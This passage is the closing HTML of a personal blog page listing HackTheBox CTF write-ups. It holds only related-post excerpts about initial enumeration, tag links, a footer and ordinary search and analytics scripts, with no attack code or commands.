class="text-muted small"><p> Enumeration Initial Information Before starting we are shown this this is a windows box and that they rate it as an easy box. Editing Hosts Lets add assign the ip address a domain name in our...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenKeyS/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T12:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenKeyS</h3><div class="text-muted small"><p> Enumeration Initial Information Based on the information provided by HackTheBox, OpenKeys is rated as medium difficulty and is running OpenBSD for it’s Operating System. Editing hosts A domai...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/HTB-Tabby/" class="btn btn-outline-primary"><p>HackTheBox - Tabby</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/FreddiPhish">FreddiPhish</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://freddiphish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
